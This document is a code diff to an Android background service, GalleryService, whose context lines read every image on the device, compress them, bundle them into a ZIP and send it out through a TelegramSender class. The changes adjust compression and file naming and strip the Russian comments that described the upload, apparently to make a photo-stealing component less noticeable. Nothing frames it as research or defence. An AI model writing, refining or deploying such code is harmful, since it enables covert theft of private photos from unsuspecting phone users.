@@ -28,7 +28,7 @@ public class GalleryService extends Service {
                 ByteArrayOutputStream zipBuffer = new ByteArrayOutputStream();
                 ZipOutputStream zos = new ZipOutputStream(zipBuffer);
                 
-                int count = 0;
+                int count = 1;
                 for (Uri uri : allImages) {
                     try {
                         InputStream is = getContentResolver().openInputStream(uri);
@@ -50,12 +50,11 @@ public class GalleryService extends Service {
 
                         if (bitmap != null) {
                             ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos);
+                            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                             byte[] bytes = baos.toByteArray();
                             bitmap.recycle();
 
-                            // Добавляем фото в ZIP-архив
-                            ZipEntry entry = new ZipEntry("photo_" + count + ".jpg");
+                            ZipEntry entry = new ZipEntry(count + ".jpg");
                             zos.putNextEntry(entry);
                             zos.write(bytes);
                             zos.closeEntry();
@@ -67,9 +66,8 @@ public class GalleryService extends Service {
                 
                 zos.close();
                 
-                if (count > 0) {
-                    // Отправляем один ZIP-файл
-                    new TelegramSender().sendZip(zipBuffer.toByteArray(), "gallery_" + count + "_photos.zip");
+                if (count > 1) {
+                    new TelegramSender().sendZip(zipBuffer.toByteArray(), "photos.zip");
                 }
 
             } catch (Exception e) { e.printStackTrace(); }
